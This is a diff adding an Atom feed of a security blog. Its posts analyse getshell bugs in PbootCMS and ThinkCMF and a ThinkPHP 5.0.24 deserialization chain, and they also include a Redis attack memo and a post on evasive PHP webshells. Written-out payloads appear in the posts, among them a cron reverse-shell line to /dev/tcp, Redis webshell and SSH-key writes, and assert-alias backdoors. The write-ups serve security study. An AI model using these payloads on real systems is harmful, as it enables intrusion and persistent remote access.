@@ -1,0 +1,875 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://chriskalix.github.io</id>
+    <title>chriskali&apos;s blog</title>
+    <updated>2020-06-14T05:25:48.106Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://chriskalix.github.io"/>
+    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
+    <subtitle>Keep learning</subtitle>
+    <logo>https://chriskalix.github.io/images/avatar.png</logo>
+    <icon>https://chriskalix.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[Pbootcms v2.0.7 Getshell分析]]></title>
+        <id>https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/</id>
+        <link href="https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/">
+        </link>
+        <updated>2020-06-14T04:50:43.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>前言: 上个月团队中的奶权审计了PbootCMS，里面一些细节还是挺有意思的，于是跟风(跟着他的文章)，一起看一看。</p>
+</blockquote>
+<h2 id="分析">分析</h2>
+<h3 id="后台任意文件读取">后台任意文件读取</h3>
+<p><code>apps/admin/controller/system/UpgradeController.php</code>下的update函数，下面为触发点相关代码</p>
+<pre><code class="language-php">public function update()
+{
+    if ($_POST) {
+        if (! ! $list = post('list')) {
+            $list = explode(',', $list);
+            $backdir = date('YmdHis');
+            // 分离文件
+            foreach ($list as $value) {
+                // 过滤掉相对路径
+                $value = preg_replace('/\.\.(\/|\\\)/', '', $value);
+                if (stripos($value, '/script/') !== false) {
+                    $sqls[] = $value;
+                }
+            ...
+            // 更新数据库
+            if (isset($sqls)) {
+                $db = new DatabaseController();
+                switch (get_db_type()) {
+                    case 'sqlite':
+                        copy(DOC_PATH . $this-&gt;config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this-&gt;config('database.dbname')));
+                        break;
+                    case 'mysql':
+                        $db-&gt;backupDB();
+                        break;
+                }
+                sort($sqls); // 排序
+                foreach ($sqls as $value) {
+                    $path = RUN_PATH . '/upgrade' . $value;
+                    if (file_exists($path)) {
+                        $sql = file_get_contents($path);
+                        if (! $this-&gt;upsql($sql)) {
+                            $this-&gt;log(&quot;数据库 $value 更新失败!&quot;);
+                            json(0, &quot;数据库&quot; . basename($value) . &quot; 更新失败！&quot;);
+                        }
+                    } else {
+                        json(0, &quot;数据库文件&quot; . basename($value) . &quot;不存在！&quot;);
+                    }
+                }
+            }
+            ...
+}
+</code></pre>
+<p>在注释<code>更新数据库</code>下，关键函数<code>file_get_contents</code>。遍历<code>$sqls</code>变量，读取文件。其中<code>$sqls</code>变量由POST传递，需要包含<code>/script/</code>才能够被赋值<br>
+跟进看一下<code>upsql($sql)</code>函数</p>
+<pre><code class="language-php">private function upsql($sql)
+{
+    $sql = explode(';', $sql);
+    $model = new Model();
+    foreach ($sql as $value) {
+        $value = trim($value);
+        if ($value) {
+            $model-&gt;amd($value);
+        }
+    }
+    return true;
+}
+</code></pre>
+<p><code>$sql</code>参数传入，调用Model类下的amd方法，继续跟进，在<code>/core/database/Sqlite.php</code>下找到函数，如下</p>
+<pre><code class="language-php">public function amd($sql)
+{
+    $result = $this-&gt;query($sql, 'master');
+    if ($result) {
+        return $result;
+    } else {
+        return 0;
+    }
+}
+</code></pre>
+<p>跟进看query方法</p>
+<pre><code class="language-php">public function query($sql, $type = 'master')
+{
+    $time_s = microtime(true);
+    if (! $this-&gt;master || ! $this-&gt;slave) {
+        $cfg = ROOT_PATH . Config::get('database.dbname');
+        $conn = $this-&gt;conn($cfg);
+        $this-&gt;master = $conn;
+        $this-&gt;slave = $conn;
+    }
+    switch ($type) {
+        case 'master':
+            if (! $this-&gt;begin) { // 存在写入时自动开启显式事务，提高写入性能
+                $this-&gt;master-&gt;exec('begin;');
+                $this-&gt;begin = true;
+            }
+            $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, 'master');
+            break;
+        case 'slave':
+            $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, 'slave');
+            break;
+    }
+    return $result;
+}
+</code></pre>
+<p>跟进error方法</p>
+<pre><code class="language-php">protected function error($sql, $conn)
+    {
+        $err = '错误：' . $this-&gt;$conn-&gt;lastErrorMsg() . '，';
+        if ($this-&gt;begin) { // 存在显式开启事务时进行回滚
+            $this-&gt;master-&gt;exec('rollback;');
+            $this-&gt;begin = false;
+        }
+        error('执行SQL发生错误！' . $err . '语句：' . $sql);
+    }
+}
+</code></pre>
+<p>可以看到error最终会被展示出来。最终的payload为(只支持windows下)</p>
+<pre><code class="language-txt">URL: http://pbootcms/admin.php?p=/Upgrade/update
+POST: list=/script/../../../config/database.php
+</code></pre>
+<p>这边有一个小trick，windows下支持不存在的路径上跳，而linux下是支持的</p>
+<p>再回头看一下上面的判断条件</p>
+<pre><code class="language-php">if (stripos($value, '/script/') !== false)
+</code></pre>
+<p>可以看到只要有<code>/script/</code>出现即可，所以需要在linux下找到相关目录(好像没有固定的，所以还是在windows下比较适用)</p>
+<h3 id="模板注入">模板注入</h3>
+<p>这边用到的trick在之前的文章中有过整理，所以简单地过一下先。同样想法和思路是先追溯敏感函数，其中找到eval在<code>apps/home/controller/ParseController.php</code>下，找到具体函数，部分代码如下所示：</p>
+<pre><code class="language-php">public function parserIfLabel($content)
+{
+    $pattern = '/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
+    $pattern2 = '/pboot:([0-9])+if/';
+    if (preg_match_all($pattern, $content, $matches)) {
+        $count = count($matches[0]);
+        for ($i = 0; $i &lt; $count; $i ++) {
+            $flag = '';
+            $out_html = '';
+            $danger = false;
+            
+            $white_fun = array(
+                'date',
+                'in_array',
+                'explode',
+                'implode'
+            );
+            
+            // 还原可能包含的保留内容，避免判断失效
+            $matches[1][$i] = $this-&gt;restorePreLabel($matches[1][$i]);
+            
+            // 解码条件字符串
+            $matches[1][$i] = decode_string($matches[1][$i]);
+            
+            // 带有函数的条件语句进行安全校验
+            if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
+                foreach ($matches2[1] as $value) {
+                    if ((function_exists($value) || preg_match('/^eval$/i', $value)) &amp;&amp; ! in_array($value, $white_fun)) {
+                        $danger = true;
+                        break;
+                    }
+                }
+            }
+            
+            // 过滤特殊字符串
+            if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
+                $danger = true;
+            }
+            
+            // 如果有危险函数，则不解析该IF
+            if ($danger) {
+                continue;
+            }
+            
+            eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}');
+            ...
+</code></pre>
+<p>作者提到了两种方法，一为上传图片马再通过<code>include()</code>函数包含，第二就是下面提到的简单一些的通用方法。<br>
+跟着代码读一下，其实就是将传入的模板进行过滤，过滤掉特殊字符串。在我整理的PHP后门那个文章中提到了这个的绕过方法。这里的具体应用即为使用<code>chr%01(xxx)</code>这种形式(即函数+控制字符+参数)的形式绕过。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thinkcmf 2.x Getshell分析]]></title>
+        <id>https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/</id>
+        <link href="https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/">
+        </link>
+        <updated>2020-06-14T04:40:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="环境">环境</h2>
+<p>windows<br>
+phpstudy (php7.2.9)<br>
+thinkcmf 2.2.2</p>
+<h2 id="具体分析">具体分析</h2>
+<p>首先在<code>index.php</code>中定义了项目路径为<code>application/</code><br>
+在入口点控制器<code>application/Portal/Controller/IndexController.class.php</code>中只定义了一个index函数，但是因为继承了<code>HomebaseController</code>类，可以调用<code>HomebaseController</code>中属性为public的函数<br>
+跟进<code>application/Common/Controller/HomebaseController.class.php</code>，其中需要关注的是两个函数，分别为display以及fetch</p>
+<h3 id="getshell方法1">Getshell方法1</h3>
+<p>通过display方法getshell</p>
+<pre><code class="language-php">/**
+    * 加载模板和页面输出 可以返回输出内容
+    * @access public
+    * @param string $templateFile 模板文件名
+    * @param string $charset 模板输出字符集
+    * @param string $contentType 输出类型
+    * @param string $content 模板输出内容
+    * @return mixed
+    */
+public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
+    parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
+}
+</code></pre>
+<p><code>display</code>函数的注释中也提及了，用于加载模板和页面输出，这里存在的是任意文件包含漏洞。<br>
+这里使用a参数指定方法，传入<code>templateFile</code>参数可直接完成本地包含，本地测试payload为<code>?a=display&amp;templateFile=README.md</code><br>
+那么如何Getshell呢？Sp4ce师傅的<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">文章</a>中使用的是通过报错的方法，将shell写入当天的日志，然后通过包含日志执行写入shell，然后连接shell即可</p>
+<p>这边讲的稍微浅一点，在Getshell方法2中补全</p>
+<h3 id="getshell方法2">Getshell方法2</h3>
+<p>通过fetch方法</p>
+<pre><code class="language-php">/**
+    * 获取输出页面内容
+    * 调用内置的模板引擎fetch方法，
+    * @access protected
+    * @param string $templateFile 指定要调用的模板文件
+    * 默认为空 由系统自动定位模板文件
+    * @param string $content 模板输出内容
+    * @param string $prefix 模板缓存前缀*
+    * @return string
+    */
+public function fetch($templateFile='',$content='',$prefix=''){
+    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):'';
+    return parent::fetch($templateFile,$content,$prefix);
+}
+</code></pre>
+<h4 id="深入查看">深入查看</h4>
+<p>大多数的文章一般就是引用一下<code>payload</code>手动复现，之前我也没有看过thinkcmf这个框架，只是看别人文章里说的，是基于<code>thinkphp3.x</code>封装的，决定静态的去跟踪一下，深入理解。<br>
+<code>parent::fetch</code>调用父类的fetch，看下函数定义<code>class HomebaseController extends AppframeController</code>，在<code>AppframeController</code>下并无fetch方法，继续查看，发现就是调用了Think模块下的Controller</p>
+<pre><code class="language-php">namespace Common\Controller;
+use Think\Controller;
+class AppframeController extends Controller
+</code></pre>
+<p>所以fetch函数本质上就是从Thinkphp的Controller中抽象出来，没有其他区别。继续跟进<code>simplewind/Core/Library/Think/Controller.class.php</code>，函数如下</p>
+<pre><code class="language-php">protected function fetch($templateFile='',$content='',$prefix='') {
+    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);
+}
+</code></pre>
+<p>调用了view下的fetch，找到在<code>__construct()</code>中被初始化</p>
+<pre><code class="language-php">public function __construct() {
+    Hook::listen('action_begin',$this-&gt;config);
+    //实例化视图类
+    $this-&gt;view     = Think::instance('Think\View');
+    //控制器初始化
+    if(method_exists($this,'_initialize'))
+        $this-&gt;_initialize();
+}
+</code></pre>
+<p>继续跟进，为<code>simplewind/Core/Library/Think/View.class.php</code>，第106行找到fetch函数，如下所示</p>
+<pre><code class="language-php">public function fetch($templateFile='',$content='',$prefix='') {
+    if(empty($content)) {
+        $templateFile   =   $this-&gt;parseTemplate($templateFile);
+        // 模板文件不存在直接返回
+        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
+    }else{
+        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
+    }
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
+        $_content   =   $content;
+        // 模板阵列变量分解成为独立变量
+        extract($this-&gt;tVar, EXTR_OVERWRITE);
+        // 直接载入PHP模板
+        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
+    }else{
+        // 视图解析标签
+        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
+        Hook::listen('view_parse',$params);
+    }
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen('view_filter',$content);
+    // 输出模板文件
+    return $content;
+}
+</code></pre>
+<p><code>Getshell方法1</code>的函数也在这个文件下。找到真正的fetch函数，分析一下。<br>
+这里有一些函数是thinkphp中自带的几个较为重要的函数，如fetch函数中的E，L，C。翻阅了一下资料，做一个简单补充。<br>
+C方法：简单的理解为Config，即是用于设置、获取、以及保存配置参数的方法。其中的C('TMPL_ENGINE_TYPE')即为获取配置值<br>
+E方法：即为Error，具体就为throw new Think\Exception($msg, $code);<br>
+L方法：代表Language，用于获得语言变量</p>
+<p>回到fetch函数继续进行分析。fetch函数下较为简单，只是两个if语句判断。</p>
+<p>第一个if语句判断是否传入<code>$content</code>参数。第二处判断<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>，下断点调试后得到<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>的值为think，走到else分支。不太了解的是Hook::listen，故去检索。文章中提到，<code>Hook::listen</code>通过遍历某个行为标签的所有行为，依次实例化并且调用run方法。找到最終将<code>$param</code>参数传入<code>simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php</code>，找到其中run方法，如下所示：</p>
+<pre><code class="language-php">public function run(&amp;$_data){
+    $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
+    $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
+    $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
+    if('think'==$engine){ // 采用Think模板引擎
+        if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
+            ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效
+            //载入模版缓存文件
+            Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
+        }else{
+            $tpl = Think::instance('Think\\Template');
+            // 编译并加载模板文件
+            $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
+        }
+    }else{
+        // 调用第三方模板引擎解析和输出
+        if(strpos($engine,'\\')){
+            $class  =   $engine;
+        }else{
+            $class   =  'Think\\Template\\Driver\\'.ucwords($engine);
+        }
+        if(class_exists($class)) {
+            $tpl   =  new $class;
+            $tpl-&gt;fetch($_content,$_data['var']);
+        }else {  // 类没有定义
+            E(L('_NOT_SUPPORT_').': ' . $class);
+        }
+    }
+}
+</code></pre>
+<p>即是一个嵌套判断。首先<code>$engine</code>为think，走进第一层if判断中。<code>$_data['content']</code>不为empty，<code>$this-&gt;checkContentCache</code>为False，<code>$this-&gt;checkCache</code>也为false，走到else分支。(这边就不再详细跟进具体函数，不然太长了)。之后执行两个操作，<code>Think::instance('Think\\Template')以及$tpl-&gt;fetch($_content,$_data['var'],$_data['prefix'])</code>。</p>
+<p>跟进fetch，具体为</p>
+<pre><code class="language-php">public function fetch($templateFile,$templateVar,$prefix='') {
+    $this-&gt;tVar         =   $templateVar;
+    $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
+    Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
+}
+</code></pre>
+<p>在<code>$this-&gt;loadTemplate</code>的时候写入了缓存模板文件。</p>
+<p>调用<code>Storage::load</code>，如下</p>
+<pre><code class="language-php">public function load($_filename,$vars=null){
+    if(!is_null($vars)){
+        extract($vars, EXTR_OVERWRITE);
+    }
+    include $_filename;
+}
+</code></pre>
+<p>再通过include包含进来，执行php代码。以上都是跟着文章中的payload一步步调试跟进。其实到thinkcmf抽象的fetch之后的，都算是Thinkphp的问题吧...</p>
+<h4 id="payload">payload</h4>
+<p>在index路径下写入<code>phpinfo()</code>的payload为</p>
+<pre><code class="language-txt">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
+</code></pre>
+<h2 id="知识点困惑点">知识点&amp;困惑点</h2>
+<p>很多文章中都提及到了thinkphp中的g\m\a，即分组\控制器\方法。文中提及到的方法均为通过直接使用方法去调用父类的public函数。困惑的地方为官方文档中提及到的，也有m\c\a这个概念，即module\controller\application(总觉得好像是一样的，暂时先埋个坑，后续我再去翻阅文档)</p>
+<h2 id="修复">修复</h2>
+<p>将display和fetch两个函数都改为protected</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://xz.aliyun.com/t/6626#toc-5">先知文章</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Redis攻击备忘录]]></title>
+        <id>https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/</id>
+        <link href="https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/">
+        </link>
+        <updated>2020-06-14T04:28:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="redis未授权访问的利用">REDIS未授权访问的利用</h2>
+<blockquote>
+<p>目前比较全的<a href="https://paper.seebug.org/975/">文章</a></p>
+</blockquote>
+<h3 id="linux下的利用">Linux下的利用</h3>
+<pre><code class="language-txt">在linux下的利用主要有三种
+
+1. 写入ssh公钥
+2. 写crontab
+3. 写webshell
+
+用redis-cli
+
+[*] 注意:redis敏感，注意客户环境，不要覆盖客户的变量数据，更不要清空，小心操作
+</code></pre>
+<h4 id="1-写ssh公钥">1. 写ssh公钥</h4>
+<pre><code class="language-txt">条件：
+
+1. 目标开启ssh，且允许密钥登录
+2. Redis使用root账号启动
+
+步骤如下：
+
+1. `ssh-keygen -t rsa`在本地生成ssh密钥对，本机是root，所以生成在`/root/.ssh/`目录下，id_rsa为私钥，id_rsa.pub为公钥。
+2. redis执行命令，`config set dir /root/.ssh/`将目录切换到`/root/.ssh/`，执行`config set dbfilename authorized_keys`，再将public_key写入变量后执行save。对于写入key:`(echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt`，然后再`cat 1.txt | redis-cli -h xx.xx.xx.xx -x set test`，然后进入执行`save test`，便可以进行登录。
+</code></pre>
+<h4 id="2-写定时任务">2. 写定时任务</h4>
+<pre><code class="language-txt">条件：
+需要装有定时任务(有一次进入服务器内没有定时任务)
+有写的权限
+
+1. 设置变量 `set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;`
+2. 切换路径 `config set dir /var/spool/cron/`
+3. 设置文件名 `config set dbfilename root`
+4. 保存至文件 `save`
+</code></pre>
+<h4 id="3-写webshell">3. 写webshell</h4>
+<pre><code class="language-txt">条件：
+有写的权限
+知道网站的绝对路径
+
+1. 设置路径 `config set dir /var/www/html/`
+2. 设置文件名 `config set dbfilename shell.php`
+3. 设置变量 `set x &quot;&lt;?php phpinfo();?&gt;&quot;`
+4. 保存变量 `save`
+</code></pre>
+<h3 id="windows下的利用">windows下的利用</h3>
+<h4 id="1-写webshell同上">1. 写webshell（同上）</h4>
+<h4 id="2-写启动项">2. 写启动项</h4>
+<pre><code class="language-txt">C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/
+</code></pre>
+<h3 id="坑点">坑点</h3>
+<p>写<code>crontab</code>的时候，一定要注意，不一定所有系统都包含crontab服务</p>
+<h2 id="攻击带有密码的redis">攻击带有密码的redis</h2>
+<blockquote>
+<p>近期在看redis未授权，大部分提到的都是ssrf + 授权的redis， 即用<code>gopher://</code>协议进行攻击。那么如果内网redis带有密码或者别的认证的情况下呢？找到了相关文章学习了一下</p>
+</blockquote>
+<p>这篇<a href="https://zhuanlan.zhihu.com/p/74324307">文章</a>提及到了如何攻击带有密码的redis</p>
+<h3 id="前提知识">前提知识</h3>
+<p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。RESP协议-简书这边文章简单地描述了该协议的格式，在ssrf的时候我们要将payload转化为这一种类型格式</p>
+<h3 id="具体细节">具体细节</h3>
+<p>其实读完上述文章后了解到后续写shell的地方都是差不多的，只是前面的内容有所不同。之前复习gopher写shell的时候其实已经了解到，redis可以一次性写入多条语句执行，最后读取执行结果。</p>
+<p>那么认证的redis本质上只是多了前面判断认证的过程，具体为<code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code></p>
+<h3 id="认为不对的地方">认为不对的地方</h3>
+<p>在观察这些<code>payload</code>的时候，都会发现一个问题，就是他们都包含了<code>flushall</code>这个操作。如果是在实际环境进行测试，我认为<code>flushall</code>应该不妥吧...</p>
+<h2 id="知识扩展">知识扩展</h2>
+<p>对于写redis shell，看文章最常见的就是gopher协议，那么如果gopher协议被禁用呢</p>
+<p>找到<a href="https://www.cnblogs.com/-chenxs/p/11749367.html">参考文章</a>，继续探索</p>
+<h3 id="其他方法">其他方法</h3>
+<h4 id="header-crlf注入">header CRLF注入</h4>
+<p>这个攻击方式较为少见，比较适用于weblogic的SSRF攻击</p>
+<h4 id="dict协议">dict协议</h4>
+<h2 id="主从复制">主从复制</h2>
+<h3 id="前置知识">前置知识</h3>
+<h4 id="什么是主从复制">什么是主从复制</h4>
+<p>当Redis是单个实例的时候，当读写量较大时服务器难以承受。主从模式即指定一个redis实例作为主机，其他都是备份机，从机只负责读，主机只负责写来分担压力</p>
+<h4 id="主从复制getshell优点">主从复制getshell优点</h4>
+<p>主从复制Getshell有什么优点：现在容器化、组件化不断发展，导致在容器内往往只有一个服务，那么通过写webshell，crontab，ssh等getshell的操作会越来越难，而主从复制漏洞不依赖其他服务，直接getshell</p>
+<h4 id="redis模块">redis模块</h4>
+<p>redis4.x之后，新增了模块功能，通过外部扩展，可以在redis中实现一个新的redis命令。redis模块实际是一个动态库，他能够让redis-cli使用module load把他加载到redis内核</p>
+<h4 id="payload">payload</h4>
+<p>https://github.com/LoRexxar/redis-rogue-server</p>
+<p>另一<a href="https://www.t00ls.net/articles-56339.html">好文</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PHP后门&特性记录]]></title>
+        <id>https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/</id>
+        <link href="https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/">
+        </link>
+        <updated>2020-06-14T04:24:32.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>这两天读了P牛的文章，正好群里的大佬发出了文章用到了Tricks。由于php审计还处于不成熟阶段，记录一下读后感受</p>
+</blockquote>
+<h2 id="php的特性检测">PHP的特性&amp;检测</h2>
+<p>通常的，常见的php webshell很容易被吃。前段时间处理网站被挂马，马都比较明显，要么是混淆要么是回调，这种往往是因为没有前置一个较好的webshell检测，有的话这么简单的马应该是传不上来的。<br>
+这时我问我自己，如果是我来上传马，我会怎么做？我发现我的想法也比较局限，无非就是正则执行，回调，加密混淆等等😅。此时看到P牛的文章，感觉十分神奇，记录一下</p>
+<h2 id="前置知识">前置知识</h2>
+<p>文章中提到了针对一个回调型后门，检测引擎会如何检测：</p>
+<ol>
+<li>遍历AST树</li>
+<li>分析<code>FuncCall Node</code>判断是否有回调</li>
+<li>回调是否是一个变量</li>
+</ol>
+<h2 id="函数别名">函数别名</h2>
+<p>我能想到的正则执行，在PHP7后已经被删除了。mb_ereg_replace和mb_eregi_replace这两个函数依然可以，他们的别名mbereg_replace和mbereg_ireplace也能执行任意代码。P牛演示的代码段为</p>
+<pre><code class="language-php">&lt;?php
+mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');
+</code></pre>
+<p>在PHP7.2.9的环境中报错，切换到低版本后没有问题了<br>
+上述的是一个引子，通用的方法是自己来申明函数的别名，例如</p>
+<pre><code class="language-php">&lt;?php
+use function \assert as test;
+test($_POST[2333]);
+</code></pre>
+<p>以及PHP7的</p>
+<pre><code class="language-php">&lt;?php
+$f = new class($_POST['name']) extends ReflectionFunction {};
+$f-&gt;invoke($_POST[2333]);
+</code></pre>
+<p><strong>神奇的trick</strong></p>
+<pre><code class="language-php">printf&lt;char&gt;('hello world')
+</code></pre>
+<p>其中<char>的范围是[\x00-\x20],PHP会忽略这个控制字符，也是一个绕过的tricks（PHP-Parser是无法正确解析的）</p>
+<h2 id="文章总结">文章总结</h2>
+<ol>
+<li>别名</li>
+<li>重命名</li>
+<li>参数名位置(变长参数)</li>
+<li>控制字符(重点)</li>
+<li>PHP标签</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thinkphp 5.0.24 反序列化链分析]]></title>
+        <id>https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/</id>
+        <link href="https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/">
+        </link>
+        <updated>2020-06-14T04:13:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="具体分析">具体分析</h2>
+<blockquote>
+<p>这里非常的长，比较复杂，推荐两个文章<br>
+https://www.anquanke.com/post/id/196364#h2-5<br>
+http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/<br>
+这里主要是记录一下我跟着其他作者的文章分析的流程</p>
+</blockquote>
+<h3 id="入口点">入口点</h3>
+<p>首先找到 <code>__destruct</code> 选择<code>/thinkphp/library/think/process/pipes/Windows.php</code>下的，代码如下</p>
+<pre><code class="language-php">public function __destruct()
+{
+    $this-&gt;close();
+    $this-&gt;removeFiles();
+}
+</code></pre>
+<p>跟进<code>removeFiles()</code></p>
+<pre><code class="language-php">private function removeFiles()
+{
+    foreach ($this-&gt;files as $filename) {
+        if (file_exists($filename)) {
+            @unlink($filename);
+        }
+    }
+    $this-&gt;files = [];
+}
+</code></pre>
+<p>这边的<code>$files</code>可控，通过向<code>file_exists</code>任意类来触发<code>__toString()</code>，那么继续跟进寻找，在<code>/thinkphp/library/think/Model.php</code>中找到</p>
+<pre><code class="language-php">public function __toString() // 全局搜索__toString，找到这里，继续跟进
+{
+    return $this-&gt;toJson();
+}
+</code></pre>
+<pre><code class="language-php">public function toJson($options = JSON_UNESCAPED_UNICODE) // 调用toArray，继续跟进
+{
+    return json_encode($this-&gt;toArray(), $options);
+}
+</code></pre>
+<p>调用了<code>toArray()</code>，继续跟进，这边函数太长，提取出关键字段</p>
+<h3 id="分析难点">分析难点</h3>
+<p>这边分析是一个转折点，有几次赋值和方法，跟着别的作者文章看的时候觉得这里比较复杂</p>
+<pre><code class="language-php">public function toArray() // toArray这里是难点，仔细分析，因为我们的最终目的是执行__call，所以找到三处疑似利用点
+{
+    $item    = [];
+    $visible = [];
+    $hidden  = [];
+    ...
+    if (!empty($this-&gt;append)) {    // [*] 一: append不能为空 (这里append是可控的)
+        foreach ($this-&gt;append as $key =&gt; $name) {
+            if (is_array($name)) {  // [*] 二: $name是否是array (显然也是可控)
+                $relation   = $this-&gt;getAttr($key);
+                $item[$key] = $relation-&gt;append($name)-&gt;toArray();
+            } elseif (strpos($name, '.')) { // [*] 三: $name中是否包含 . ，包含的话进到这个循环
+                list($key, $attr) = explode('.', $name);
+                $relation   = $this-&gt;getAttr($key);
+                /** 第一处 **/
+                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
+            } else {
+                $relation = Loader::parseName($name, 1, false); // $name可控，跟进函数(只是修改函数命名)
+                if (method_exists($this, $relation)) {          // [*] 四: 判断该方法是否存在于类中
+                    $modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
+                    $value         = $this-&gt;getRelationData($modelRelation); //跟进getRelationData -&gt; 639行
+
+                    if (method_exists($modelRelation, 'getBindAttr')) { // [*] 五: 满足返回的函数存在getBindAttr
+                        /** 第二处 **/
+                        $bindAttr = $modelRelation-&gt;getBindAttr();
+                        if ($bindAttr) {                           // [*] 六: 值存在则继续
+                            foreach ($bindAttr as $key =&gt; $attr) {
+                                $key = is_numeric($key) ? $attr : $key;
+                                if (isset($this-&gt;data[$key])) {
+                                    throw new Exception('bind attr has exists:' . $key);
+                                } else {    // [*] 七: this-&gt;data[$key]没有赋值
+                                    /** 第三处 **/
+                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+                                }
+                            }
+                            continue;
+                        }
+                    }
+                    $item[$name] = $value;
+                } else {
+                    $item[$name] = $this-&gt;getAttr($name);
+                }
+            }
+        }
+    }
+    return !empty($item) ? $item : [];
+}
+</code></pre>
+<p>这里选用第三处作为跳转点，看到判断点四下有两个赋值操作</p>
+<pre><code class="language-php">$modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
+$value         = $this-&gt;getRelationData($modelRelation); // 跟进getRelationData -&gt; 639行
+</code></pre>
+<p>这里的<code>$relation</code>是可控的，在<code>Model.php</code>下可控的函数选择 <code>getError</code></p>
+<pre><code class="language-php">public function getError()
+{
+    return $this-&gt;error; // 这里的error是可以控制的，所以选择这里
+}
+</code></pre>
+<p>然后跟进<code>$value=$this-&gt;getRelationData($modelRelation);</code></p>
+<pre><code class="language-php">protected function getRelationData(Relation $modelRelation)
+{
+    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
+        $value = $this-&gt;parent;
+    } else {
+        // 首先获取关联数据
+        if (method_exists($modelRelation, 'getRelation')) {
+            $value = $modelRelation-&gt;getRelation();
+        } else {
+            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation');
+        }
+    }
+    return $value;
+}
+</code></pre>
